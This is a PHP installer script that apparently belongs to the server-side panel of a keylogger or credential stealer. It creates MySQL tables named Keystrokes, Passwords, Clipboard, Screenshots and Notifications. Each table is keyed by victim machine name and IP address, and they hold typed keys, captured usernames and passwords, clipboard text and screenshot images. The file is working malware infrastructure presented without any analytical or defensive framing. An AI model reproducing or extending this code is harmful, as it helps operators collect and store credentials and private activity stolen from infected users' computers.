<?php
ob_start();
include('config.php');

$conn = new mysqli($mysql_host, $mysql_user, $mysql_password, $mysql_database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sqlk = 'CREATE TABLE if not exists Keystrokes (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, windowtitle VARCHAR(255) NOT NULL,
keystrokestyped VARCHAR(255), machinetime VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)';
$sqlp =  'CREATE TABLE if not exists Passwords (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, application VARCHAR(255) NOT NULL,  link VARCHAR(255) NOT NULL,
username VARCHAR(255), password VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)';
$sqlc = 'CREATE TABLE if not exists Clipboard (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, windowtitle VARCHAR(255) NOT NULL, 
clipboardtext VARCHAR(255) NOT NULL, machinetime VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)';
$sqls = 'CREATE TABLE if not exists Screenshots(id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, image LONGBLOB, imagetype VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)';
$sqln = 'CREATE TABLE if not exists Notifications (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, machinetime VARCHAR(255), ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)';

if (($conn->query($sqlk) === TRUE) and
($conn->query($sqlp) === TRUE) and
($conn->query($sqlc) === TRUE) and
($conn->query($sqls) === TRUE) and
($conn->query($sqln) === TRUE))  {
echo "<br>";
}
else
{
echo "<br>Error";
}
?>